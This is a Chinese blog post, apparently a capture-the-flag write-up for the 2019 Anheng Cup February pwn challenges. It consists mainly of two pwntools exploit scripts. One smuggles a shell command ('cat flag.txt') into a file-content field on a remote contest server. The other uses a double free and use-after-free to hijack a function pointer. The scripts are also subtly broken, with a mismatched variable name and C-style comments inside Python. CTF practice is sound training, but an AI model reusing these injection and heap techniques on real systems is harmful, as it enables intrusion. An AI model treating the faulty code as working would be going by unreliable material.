<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>‘ 2019安恒杯2月月赛pwn  - NO</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/favicon.ico"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://norw1nd.github.io/"><span>Norw1nd‘blog</span></a></li><li><a href="https://no4l.github.io/"><span>no4l’blog</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://callfiles.ueibo.com/hexo-theme-laughing/post_background.jpg"><div class="post-title"><h1 class="title">‘ 2019安恒杯2月月赛pwn </h1><ul class="meta"><li><i class="icon icon-author"></i>会飞的鱼</li><li><i class="icon icon-clock"></i>6 Minutes</li><li><i class="icon icon-calendar"></i>February 25, 2019</li></ul></div></div><div class="article-content" style="max-width:800px"><h3 id="1-filesystem"><a href="#1-filesystem" class="headerlink" title="1.filesystem"></a>1.filesystem</h3><p>注入？？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./filesystem&apos;)</span><br><span class="line">p=remote(&apos;101.71.29.5&apos;,10017)</span><br><span class="line">def Create(Name):</span><br><span class="line">    p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">    p.sendline(&apos;Create&apos;)</span><br><span class="line">    p.recvuntil(&apos;Input Filename: &apos;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">def Edit(content,idx):</span><br><span class="line">    p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">    p.sendline(&apos;Edit&apos;)</span><br><span class="line">    p.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&apos;Input File Content:&apos;)</span><br><span class="line">    p.sendline(str(content))</span><br><span class="line">def Checksec(idx):</span><br><span class="line">    p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">    p.sendline(&apos;Checksec&apos;)</span><br><span class="line">    p.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def Read(idx):</span><br><span class="line">    p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">    p.sendline(&apos;Read&apos;)</span><br><span class="line">    p.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">    p.sendline(str(idx))    </span><br><span class="line"></span><br><span class="line">Create(&apos;aaaa&apos;) </span><br><span class="line">Edit(&apos;1&quot;|cat flag.txt||&quot;&apos;,0)</span><br><span class="line">Checksec(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="2-hackmoon"><a href="#2-hackmoon" class="headerlink" title="2.hackmoon"></a>2.hackmoon</h3><p>Double Free&amp;uaf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p=process(&apos;./hackmoon&apos;)</span><br><span class="line"></span><br><span class="line">def Add(size,content):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(content))</span><br><span class="line">def Del(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def Printf(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">//这里只能add5次</span><br><span class="line">Magic=0x0804898F</span><br><span class="line">Add(24,&apos;aaaa&apos;)</span><br><span class="line">Add(24,&apos;bbbb&apos;)</span><br><span class="line">Del(0)  </span><br><span class="line">Del(1)  //fastbin表链入俩个0x8大小的chunk，两个0x18大小的chunk</span><br><span class="line">Add(8,p32(Magic)*2)</span><br><span class="line">Printf(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
